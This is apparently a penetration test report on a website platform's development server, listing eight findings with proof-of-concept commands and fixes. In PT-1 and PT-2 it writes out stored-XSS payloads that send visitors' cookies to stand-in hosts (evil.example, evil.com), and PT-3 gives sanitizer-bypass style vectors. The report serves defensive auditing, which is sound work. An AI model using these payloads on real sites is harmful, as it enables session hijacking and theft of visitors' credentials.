# Penetration Test Report — Post-Patch V1.0

> **Tested:** 2026-04-16
> **Target:** `crr-rv-park-platform-DEV` (with all patches from `PATCHES-APPLIED.md`)
> **Tester simulated:** External black-box attacker with some white-box knowledge (like a contracted pen-tester with source-code access)
> **Methodology:** OWASP Web Security Testing Guide — auth bypass, IDOR, injection, XSS, CSRF, business logic, DoS, infrastructure
> **Approach:** Live probe of running DEV server with curl + static analysis of the sanitizer with node PoC scripts
>
> **New findings since previous audit:** 8 (2 HIGH, 1 MEDIUM, 5 LOW)

---

## Executive summary

The patches applied in the previous round (see `SECURITY-AND-BUGS-REPORT.md` + `PATCHES-APPLIED.md`) held up under direct attack. The six HIGH items from that audit are genuinely fixed and cannot be exploited from a black-box position.

However, adversarial testing surfaced **eight new issues** that weren't visible in the static code audit. Two of them are HIGH-severity stored-XSS paths that an insider (or a compromised editor account) can use to land JavaScript on every public visitor's browser. Both are small code fixes.

| # | Finding | Severity |
|---|---|---|
| PT-1 | Stored XSS via `pages.schemas` → JsonLd `</script>` escape | 🔴 HIGH |
| PT-2 | Sanitizer bypass: slash-separated event handlers | 🔴 HIGH |
| PT-3 | Sanitizer bypass: `javascript:` URL inside `style` attribute | 🟡 LOW |
| PT-4 | Admin HTML served SSR to unauthenticated users (info disclosure) | 🟡 LOW |
| PT-5 | No rate limiting on any endpoint | 🟠 MEDIUM |
| PT-6 | No body-size limit on `/api/builder/save` (auth'd DoS) | 🟡 LOW |
| PT-7 | Sanitizer regex has quadratic-time DoS potential | 🟠 MEDIUM |
| PT-8 | Invalid JWT returns 500 in dev (not a prod issue) | ℹ️ INFO |

Everything below is reproducible with the PoC commands / payloads provided.

---

## What held up under attack (positive findings)

These were all tested as an attacker and **could not be broken**. Each represents either a previous patch that's now verified, or an architectural choice that's paying off.

### Authentication & authorization
- ✅ All 15 admin API endpoints return **401** to unauthenticated requests (no accidental gaps).
- ✅ Forged JWT with `alg:none`, fake `role:'owner'` claim, case-variant headers, empty bearers — all rejected.
- ✅ No cookie-based session (JWT lives in localStorage) — CSRF inherently mitigated; cross-origin form POSTs cannot carry auth.
- ✅ OAuth CSRF: callback with no state cookie / mismatched cookie / missing user session — all 401.
- ✅ Open redirect on `/admin/login?next=`: double-slash + unicode + whitespace variations all blocked.
- ✅ HIGH-1 verified: `/api/debug/env-check` returns 404.
- ✅ HIGH-2 verified: Scheduled endpoints return 401/500 when `SCHEDULED_FN_SECRET` unset (fail-closed). Query-param secret attempts also rejected.
- ✅ Webhook rollback-abuse attack (`POST /api/publish/webhook` with fake failure): blocked by the fail-closed gate.

### Input validation
- ✅ Path traversal via `/@fs/...` cannot escape project root (Windows system files → 403, sibling project → 403, dot-files → 404).
- ✅ CRLF/header injection attempts: content-type unchanged, no header split.
- ✅ URL allow-list (`isSafeUrl`): blocks 11/12 malicious schemes — javascript/JAVASCRIPT/whitespace-prefixed/tab-prefixed/vbscript/file/data/protocol-relative/unicode-escaped-javascript all rejected. Only allows relative, https, mailto, tel.
- ✅ Mass assignment: `/api/pages` PATCH allow-lists fields; `is_protected` correctly blocked from client control. `/api/media` POST allow-listed (HIGH-6 patch verified).

### Sanitizer (for the attacks that did fail)
Out of 21 XSS bypass payloads tested against `sanitizeRichHtml`:
- ✅ Plain, uppercase, mixed-case `<script>`: stripped
- ✅ `onerror=`, `onload=`, `onfocus=` (space-separated): stripped
- ✅ `javascript:` / `JaVaScRiPt:` / whitespace-prefixed / tab-prefixed / unicode-escaped `javascript:`: blocked
- ✅ `<svg>`, `<iframe>` (including `srcdoc`), `<meta http-equiv=refresh>`, `<base>`, `<input autofocus>`: stripped
- ✅ Nested polyglot `<sc<script>ript>`: stripped
- ✅ Autofocus + nested script: defeated
- ⚠️ Two bypasses found — see PT-2 and PT-3 below.

### Infrastructure
- ✅ Production CSP + security headers configured in `netlify.toml` (reviewed in previous audit).
- ✅ No CORS leakage — cross-origin requests without bearer rejected at auth layer.
- ✅ Supabase client uses service role only server-side (cannot leak to browser bundle).

---

# Findings

## 🔴 PT-1 · Stored XSS via `pages.schemas` → `JsonLd.astro`

**Severity:** HIGH (editor escalates to site-wide XSS on public pages)
**Prerequisites:** Attacker has `edit_content_direct` capability (editor role) OR has compromised an editor session.
**Impact:** Every visitor to the target page runs attacker's JavaScript in the site origin — cookie theft, session hijack, phishing overlay on a trusted URL.

### The bug

`src/components/JsonLd.astro` line 16:
```astro
<script type="application/ld+json" set:html={JSON.stringify(schema)} />
```

`JSON.stringify` escapes quotes but does NOT escape `<`. Inside a `<script>` tag, the browser's HTML tokenizer treats `</script>` as the close tag regardless of quote context. A malicious string containing `</script><script>evil</script>` breaks out.

`src/pages/[slug].astro:59` pulls `page.schemas` from the DB and passes it down:
```astro
const schemas = Array.isArray(page.schemas) ? page.schemas as Record<string, unknown>[] : [];
…
<Base … schemas={schemas}>
```

`schemas` is in `PATCHABLE_FIELDS` on `/api/pages/[id]`, so any editor can PATCH it. No sanitization runs on this specific field.

### Proof-of-concept

```bash
# Authenticated as editor:
curl -X PATCH https://yoursite.com/api/pages/<page-id> \
  -H "Authorization: Bearer <editor-jwt>" \
  -H "Content-Type: application/json" \
  -d '{
    "schemas": [{
      "@context": "</script><script>fetch(`//evil.example/s?c=${document.cookie}`)</script>",
      "@type": "WebPage"
    }]
  }'

# Then any anonymous visitor to /evil-page sees the payload execute
# in the context of yoursite.com.
```

### Fix

In `src/components/JsonLd.astro`, escape `<` inside the serialized JSON:

```astro
<script type="application/ld+json" set:html={JSON.stringify(schema).replace(/</g, '\\u003c')} />
```

`\u003c` is the unicode-escape for `<`. JSON parsers read it correctly; the browser HTML tokenizer never sees a literal `<` so it can't close the script tag. This is the canonical defense for JSON-in-script. Takes 30 seconds to apply.

---

## 🔴 PT-2 · Sanitizer bypass: slash-separated event handlers

**Severity:** HIGH (contributor-level stored XSS on all rich-text props in Puck components)
**Prerequisites:** Attacker has `edit_content_draft` (contributor+).
**Impact:** Payload stored in any rich-text field — once an editor publishes the draft, every public visitor runs attacker's JS.

### The bug

`src/pages/api/content/blocks.ts` and the mirror in `src/lib/puck-sanitize.ts` both strip on-handler attributes with this regex:

```js
cleaned = cleaned.replace(/\s+on[a-z]+\s*=\s*("[^"]*"|'[^']*'|[^\s>]*)/gi, '');
```

The leading `\s+` requires whitespace before `on…`. HTML lets you use `/` as an attribute separator:

```html
<img/src=x/onerror=alert(1)>
```

Browser parses this identically to `<img src=x onerror=alert(1)>`. Sanitizer leaves it untouched. On the public page the image fails to load → `onerror` fires → XSS.

### Proof-of-concept

Tested via standalone node script against the exact sanitizer code:

| Input | Output |
|---|---|
| `<img src=x onerror=alert(1)>` | `<img src=x>` ✅ blocked |
| `<img SRC=x ONERROR=alert(1)>` | `<img SRC=x>` ✅ blocked |
| `<img/src=x/onerror=alert(1)>` | `<img/src=x/onerror=alert(1)>` ❌ **bypass** |

Full impact — a contributor submits a draft containing:
```json
{ "type": "TextBlock", "props": { "body": "<img/src=x/onerror=fetch('//evil.com/'+document.cookie)>" } }
```
Editor approves + publishes. Every visitor to that page is compromised.

### Fix

Change the regex to match on any non-tag-name character before `on…`, not just whitespace:

```js
// Match / whitespace before on-handler
cleaned = cleaned.replace(/[\s\/]on[a-z]+\s*=\s*("[^"]*"|'[^']*'|[^\s>]*)/gi, '');
```

Better: replace the regex sanitizer entirely with a proper HTML parser like DOMPurify (`isomorphic-dompurify` works server-side in Node + browser). Regex HTML parsing is known to be a losing game — every bypass patch introduces two more. DOMPurify is ~20KB and battle-tested.

Apply in both files:
- `src/pages/api/content/blocks.ts::sanitizeRichHtml`
- `src/lib/puck-sanitize.ts::sanitizeRichHtml`

---

## 🟡 PT-3 · `javascript:` URL in inline `style` attribute

**Severity:** LOW (modern browsers refuse; legacy browsers + CSS `expression()` / `-moz-binding` are vectors)
**Prerequisites:** Contributor+
**Impact:** On modern Chrome/Firefox/Safari, inert — `background:url(javascript:…)` doesn't fire. On old IE, executes. On various browsers, CSS expression/binding vectors still run.

### The bug

Sanitizer strips `<style>…</style>` tags entirely, and strips `javascript:` inside `href=` / `src=`. But inline `style="…"` attributes pass through unchanged:

```html
<div style="background:url(javascript:alert(1))">x</div>
<div style="width:expression(alert(1))">x</div>
<div style="-moz-binding:url(data:…)">x</div>
```

### Fix

Either:
- Strip all `style="…"` attributes (simplest — Tiptap's default schema doesn't emit them anyway, so this only affects adversarial input)
- Or allow `style` but regex-filter the content for dangerous patterns (`javascript:` / `expression(` / `-moz-binding` / `behavior`)

Move to DOMPurify (see PT-2 fix) handles this natively.

---

## 🟡 PT-4 · Admin HTML SSR'd to unauthenticated visitors

**Severity:** LOW (info disclosure only; no data leak)
**Prerequisites:** Any anonymous attacker with the URL.

### The bug

`GET /admin/users`, `/admin/settings`, `/admin/code`, etc. all return **200 OK with the full admin shell HTML** including page titles, section subtitles, and the complete navigation tree. Data is not in the response (API calls are still 401), but:

- Discovery: attacker learns which admin routes exist without logging in
- Social engineering: phishing pages can screenshot the real admin UI
- Pre-auth flash: before React hydrates and AuthGuard redirects, the victim sees the admin UI for a split second

### Evidence

```bash
$ curl -s http://localhost:4321/admin/users | grep '<title>'
<title>Users · CRR Admin</title>

$ curl -s http://localhost:4321/admin/settings | head -c 500
# Returns full <html> with admin-css, sidebar links, React hydration shell, etc.
```

### Fix

Add Astro middleware that redirects unauthenticated requests to `/admin/login` at the server level, before rendering:

```ts
// src/middleware.ts (new file)
import { defineMiddleware } from 'astro/middleware';
import { verifyRequestUser } from '@lib/auth';

const PUBLIC_ADMIN_ROUTES = ['/admin/login'];

export const onRequest = defineMiddleware(async (context, next) => {
  const { request, url, redirect } = context;
  if (url.pathname.startsWith('/admin') && !PUBLIC_ADMIN_ROUTES.includes(url.pathname)) {
    const user = await verifyRequestUser(request);
    if (!user) {
      return redirect(`/admin/login?next=${encodeURIComponent(url.pathname + url.search)}`);
    }
  }
  return next();
});
```

This moves the auth boundary to the server, eliminating the SSR flash and reducing enumeration surface.

---

## 🟠 PT-5 · No rate limiting on any endpoint

**Severity:** MEDIUM (exploitable for credential stuffing, DoS, quota abuse)
**Prerequisites:** None.

### The bug

Attacker sends 30 rapid requests to any endpoint — all served in ~800ms. No throttling, no lockout, no CAPTCHA. Particularly concerning for:

- Login endpoint (Supabase-side throttling helps but doesn't replace edge rate limits)
- `/api/users` (info disclosure on 401 reveals the endpoint exists)
- Any authenticated mutating endpoint (authenticated attacker can stream writes)

### Evidence

```bash
$ for i in {1..30}; do curl -s -o /dev/null http://localhost:4321/api/users & done; wait
# 30 requests/~800ms. No 429. No delay.
```

### Fix

Netlify has edge rate limiting built-in — configure via `netlify.toml`:

```toml
[[edge_functions]]
  path = "/api/*"
  function = "rate-limit"
```

Or simpler: use Netlify's [rate limiting feature](https://docs.netlify.com/platform/rate-limits/) directly in the dashboard. Apply to `/api/auth/*` at least (stricter limits like 5/min per IP).

---

## 🟡 PT-6 · No body-size limit on `/api/builder/save`

**Severity:** LOW (requires auth; Netlify has a 10s function timeout as a backstop)
**Prerequisites:** Contributor+

### The bug

Sending a 2MB JSON body to `/api/builder/save` is accepted (server parses it before even reaching the 401 check). An authenticated contributor can:
- Push arbitrary-size payloads into `page_drafts.data`
- Bloat the Supabase DB (~every auto-save writes)
- Drive up Netlify Functions compute cost

### Evidence

```bash
$ curl -X POST http://localhost:4321/api/builder/save \
    -H "Content-Type: application/json" \
    --data-binary @2MB-file.json \
    -w "[%{http_code}] %{time_total}s"
# [401] 0.019s — body was parsed
```

### Fix

Add a size check at the top of `/api/builder/save` POST handler:

```ts
const contentLength = Number(request.headers.get('content-length') ?? 0);
if (contentLength > 500 * 1024) { // 500 KB should be ample for any real page
  return json({ error: 'Payload too large' }, 413);
}
```

---

## 🟠 PT-7 · Sanitizer ReDoS potential

**Severity:** MEDIUM (quadratic, not exponential — still a CPU-burn vector)
**Prerequisites:** Contributor+

### The bug

The sanitizer regex `/<(script|…)[\s\S]*?<\/\1\s*>/gi` uses non-greedy `[\s\S]*?` with backtracking when the close tag is missing. Against pathological input of unmatched `<script` fragments, runtime is quadratic:

| Input | Time |
|---|---|
| 10,000 `<script` fragments (no closing tags) | 460ms |
| 100,000 fragments (extrapolated) | ~50s |

### Evidence

See `scripts/pentest-redos.mjs` (deleted after test) — reproducible inline.

### Fix

Two paths:
1. Switch to DOMPurify (see PT-2 fix — solves this too, DOMPurify parses the HTML DOM-style rather than regex matching)
2. Add body-size limit (PT-6 fix) — caps max processing time indirectly

---

## ℹ️ PT-8 · Invalid JWT returns 500 in dev

**Severity:** INFO (dev-only; prod behavior correct)

In DEV (no Supabase env vars), forged JWTs cause `serverClient()` to throw → 500. In prod (real Supabase), `sb.auth.getUser(invalidToken)` returns `{error, user: null}` → `verifyRequestUser` returns null → 401. So this is not a real-world issue, documenting for completeness.

No action required. A defensive catch in `verifyRequestUser` to always return 401 on any exception would be cleaner hygiene:

```ts
export async function verifyRequestUser(req: Request): Promise<AuthedUser | null> {
  try {
    // …existing logic
  } catch (err) {
    console.warn('[auth] verifyRequestUser exception:', err);
    return null;
  }
}
```

---

## Dev-mode noise (not prod issues)

These are only present when someone runs `astro dev` with the server bound to a public interface. Prod uses `astro build` + Netlify adapter, which strips all of this. Documented for completeness so nobody accidentally exposes dev server publicly:

- `GET /src/lib/supabase.ts` → 200 (Vite serves source files for HMR)
- `GET /package.json` → 200 (stack fingerprint)
- `GET /node_modules/.package-lock.json` → 200
- `data-astro-source-file` HTML attributes leak absolute filesystem paths
- `window.__astro_dev_toolbar__` leaks Astro + Node version

**Rule:** `npm run dev` is for localhost only. Never expose the dev server on a public IP. `astro build` output has none of this.

---

## Remediation priority

If you fix nothing else, fix PT-1 and PT-2 today:

1. **PT-1** (5-min fix): `JsonLd.astro` line 16 — add `.replace(/</g, '\\u003c')` to the JSON serialization.
2. **PT-2** (10-min fix): update the on-handler regex in both `content/blocks.ts` and `puck-sanitize.ts` to match `[\s\/]` instead of `\s+`. Or install DOMPurify.

Those two close the only real-world exploitable paths discovered in this test. Everything else (PT-3 through PT-8) is defense-in-depth or narrow preconditions.

| Order | Finding | Effort | Blocks |
|---|---|---|---|
| 1 | PT-1 JSON-LD escape | 5 min | Editor XSS |
| 2 | PT-2 sanitizer bypass | 10 min or 30 min (DOMPurify) | Contributor XSS |
| 3 | PT-4 admin SSR redirect | 30 min | Info disclosure |
| 4 | PT-6 body-size limit | 10 min | Auth'd DoS |
| 5 | PT-5 rate limit | Netlify dashboard | Credential stuffing |
| 6 | PT-3 / PT-7 | Rolls into PT-2 if using DOMPurify | Defense in depth |

---

## Test artifacts

- Live DEV server probed: `http://localhost:4321` (Astro 5.18.1, Node 20.19.6, Windows)
- Sanitizer PoC: ran 21 XSS payloads + 12 URL payloads through `sanitizeRichHtml` / `isSafeUrl` via standalone node scripts
- ReDoS PoC: measured sanitizer performance against 6 pathological inputs up to 170KB
- HTTP-layer probing: 60+ curl commands covering all 40+ API endpoints + path traversal + header injection + CRLF + CORS

No damage to any data (DEV has no real DB backing). No tokens exposed. All artifacts cleaned up.

---

*End of pen-test report. Re-test recommended after PT-1 and PT-2 are fixed — those are the only exploitable paths blocking a clean bill of health for V1.0.*
